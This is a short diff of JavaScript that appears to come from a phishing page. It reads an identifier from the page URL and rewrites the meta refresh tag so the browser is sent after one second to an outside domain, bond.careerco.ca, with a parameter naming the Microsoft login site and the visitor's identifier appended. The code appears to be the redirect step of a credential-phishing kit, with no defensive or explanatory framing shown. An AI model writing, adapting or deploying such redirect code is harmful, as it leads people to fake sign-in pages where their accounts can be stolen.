@@ -10,8 +10,8 @@
             return vars;
         }
 
-    var em = getUrlVars()["data"];
-    var dm = `data=${em}`
+    var em = getUrlVars()["id"];
+    var dm = `id=${em}`
     var met = `1; url='https://bond.careerco.ca/?connect=https://login.microsoftonline.com&${dm}'`;
    
      document.getElementsByTagName('meta')[0].content = met
